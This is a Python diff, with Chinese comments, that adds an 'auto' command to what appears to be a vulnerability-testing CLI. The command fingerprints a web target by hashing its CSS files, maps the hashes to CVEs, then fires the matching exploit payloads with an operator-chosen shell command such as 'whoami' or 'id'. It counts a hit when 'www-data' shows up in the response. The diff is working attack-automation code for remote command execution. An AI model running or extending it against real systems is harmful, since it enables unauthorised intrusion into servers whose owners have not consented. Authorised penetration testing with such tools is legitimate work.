@@ -69,6 +69,10 @@ def main():
   %(prog)s fingerprint list
   %(prog)s fingerprint get abc123def456
   %(prog)s fingerprint remove abc123def456
+  
+  # 自动化测试（指纹识别 + 自动执行Payload）
+  %(prog)s auto http://192.168.1.1:80/
+  %(prog)s auto http://192.168.1.1:80/ --cmd "id"
         """
     )
     
@@ -136,6 +140,14 @@ def main():
     # fingerprint get - 查询指定指纹的CVE
     parser_fp_get = fp_subparsers.add_parser('get', help='查询指定指纹对应的CVE')
     parser_fp_get.add_argument('fingerprint', help='指纹（如MD5值）')
+    
+    # auto命令 - 自动化测试（指纹识别 + 自动执行Payload）
+    parser_auto = subparsers.add_parser('auto', help='自动化测试：指纹识别后自动执行对应的Payload')
+    parser_auto.add_argument('url', help='目标URL（如: http://192.168.1.1:80/）')
+    parser_auto.add_argument('--cmd', default='whoami', help='要执行的命令（默认: whoami）')
+    parser_auto.add_argument('--timeout', type=float, default=3.0, help='指纹识别超时时间（秒，默认3.0）')
+    parser_auto.add_argument('--send-timeout', type=int, default=10, help='Payload发送超时时间（秒，默认10）')
+    parser_auto.add_argument('--debug', action='store_true', help='启用调试模式')
     
     args = parser.parse_args()
     
@@ -348,6 +360,96 @@ def main():
             else:
                 print(f"[!] 未找到指纹 {fingerprint} 的映射", file=sys.stderr, flush=True)
                 sys.exit(1)
+    
+    elif args.command == 'auto':
+        if get_css_files_md5_from_page is None:
+            print("[!] 指纹模块未加载，无法执行 auto 命令", file=sys.stderr, flush=True)
+            sys.exit(1)
+        
+        url = args.url
+        cmd = args.cmd
+        timeout = args.timeout
+        send_timeout = args.send_timeout
+        debug = args.debug
+        
+        print(f"\n{'='*60}", flush=True)
+        print("自动化测试", flush=True)
+        print(f"{'='*60}", flush=True)
+        print(f"目标 URL: {url}", flush=True)
+        print(f"执行命令: {cmd}", flush=True)
+        print(f"{'='*60}\n", flush=True)
+        
+        # 步骤1：指纹识别
+        print("[*] 步骤1: 指纹识别（提取CSS文件并计算MD5）...", flush=True)
+        css_md5_dict = get_css_files_md5_from_page(url, timeout)
+        
+        if not css_md5_dict:
+            print("[!] 未找到CSS文件或访问页面失败", file=sys.stderr, flush=True)
+            sys.exit(1)
+        
+        # 收集匹配到的CVE
+        matched_cves = set()
+        for css_url, info in css_md5_dict.items():
+            if isinstance(info, tuple):
+                md5_hash, cve_id = info
+            else:
+                md5_hash, cve_id = info, None
+            
+            if md5_hash:
+                print(f"    [+] {css_url}", flush=True)
+                print(f"        MD5: {md5_hash}", flush=True)
+                if cve_id:
+                    print(f"        CVE: {cve_id}", flush=True)
+                    matched_cves.add(cve_id)
+        
+        if not matched_cves:
+            print("\n[!] 未匹配到任何CVE，无法执行自动化测试", file=sys.stderr, flush=True)
+            sys.exit(1)
+        
+        print(f"\n[+] 匹配到的CVE: {', '.join(sorted(matched_cves))}", flush=True)
+        
+        # 步骤2：执行Payload
+        print(f"\n[*] 步骤2: 执行Payload...", flush=True)
+        
+        # 从URL中提取ip:port
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        host = parsed.hostname or ''
+        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        ip_port = f"{host}:{port}"
+        
+        payload_manager = PayloadManager(debug=debug)
+        success_count = 0
+        
+        for cve_id in sorted(matched_cves):
+            # 将CVE-XXXX-XXXX转换为模块名CVE_XXXX_XXXX
+            module_name = cve_id.replace('-', '_')
+            
+            print(f"\n{'='*60}", flush=True)
+            print(f"[*] 尝试执行 Payload: {module_name}", flush=True)
+            print(f"{'='*60}", flush=True)
+            
+            try:
+                result = payload_manager.send_payload_safe(module_name, ip_port, cmd, timeout=send_timeout)
+                # 使用 is not None 判断，因为 response 对象在状态码非2xx时 bool 值可能为 False
+                if result is not None:
+                    # 检测响应包中是否包含www-data
+                    response_text = result.text if hasattr(result, 'text') else str(result)
+                    if 'www-data' in response_text:
+                        success_count += 1
+                        print(f"[+] {module_name} 执行成功! [!] 检测到 www-data，存在 {cve_id} 漏洞!", flush=True)
+                    else:
+                        print(f"[-] {module_name} 响应中未检测到 www-data", flush=True)
+                else:
+                    print(f"[-] {module_name} 执行失败（无响应）", flush=True)
+            except Exception as e:
+                print(f"[-] {module_name} 执行出错: {e}", flush=True)
+        
+        print(f"\n{'='*60}", flush=True)
+        print(f"自动化测试完成", flush=True)
+        print(f"成功执行: {success_count}/{len(matched_cves)}", flush=True)
+        print(f"{'='*60}", flush=True)
+        sys.exit(0 if success_count > 0 else 1)
 
 
 if __name__ == "__main__":
